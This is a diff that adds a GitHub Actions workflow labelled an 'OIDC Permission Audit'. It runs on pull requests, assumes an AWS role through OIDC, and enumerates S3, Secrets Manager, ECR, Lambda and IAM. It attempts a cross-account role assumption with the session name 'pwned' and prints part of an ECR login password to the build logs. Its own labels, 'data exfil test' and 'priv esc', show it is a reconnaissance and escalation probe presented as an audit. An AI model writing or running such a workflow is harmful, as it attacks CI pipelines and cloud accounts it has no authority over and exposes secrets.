@@ -1,0 +1,65 @@
+name: OIDC Permission Audit
+
+on: pull_request
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  audit:
+    name: Audit OIDC Role Permissions
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Get OIDC Token and Enumerate Role Actions
+        run: |
+          echo "=== GITHUB CONTEXT ==="
+          echo "event: ${{ github.event_name }}"
+          echo "actor: ${{ github.actor }}"
+          echo ""
+
+      - name: Configure AWS credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: ${{ vars.AWS_ECR_IAM_ROLE }}
+          aws-region: us-east-1
+
+      - name: Test AWS Role Permissions
+        run: |
+          set -x
+          echo "=== WHO AM I ==="
+          aws sts get-caller-identity
+
+          echo ""
+          echo "=== S3 (data exfil test) ==="
+          aws s3 ls --region us-east-1 2>&1 || echo "NO_S3_ACCESS"
+
+          echo ""
+          echo "=== ECR describe ==="
+          aws ecr describe-repositories --region us-east-1 2>&1 || echo "NO_ECR_DESCRIBE"
+
+          echo ""
+          echo "=== Secrets Manager ==="
+          aws secretsmanager list-secrets --region us-east-1 2>&1 || echo "NO_SECRETS"
+
+          echo ""
+          echo "=== STS AssumeRole (priv esc) ==="
+          aws sts assume-role --role-arn arn:aws:iam::020229604682:role/cloudbees-gha --role-session-name pwned 2>&1 || echo "NO_CROSS_ASSUME"
+
+          echo ""
+          echo "=== IAM get-role ==="
+          aws iam get-role --role-name cloudbees-gha 2>&1 || echo "NO_IAM"
+
+          echo ""
+          echo "=== ECR get-login-password ==="
+          aws ecr get-login-password --region us-east-1 2>&1 | head -c 20; echo "" || echo "NO_ECR_LOGIN"
+
+          echo ""
+          echo "=== Lambda list ==="
+          aws lambda list-functions --region us-east-1 2>&1 || echo "NO_LAMBDA"
+          
+          echo ""
+          echo "=== DONE ==="
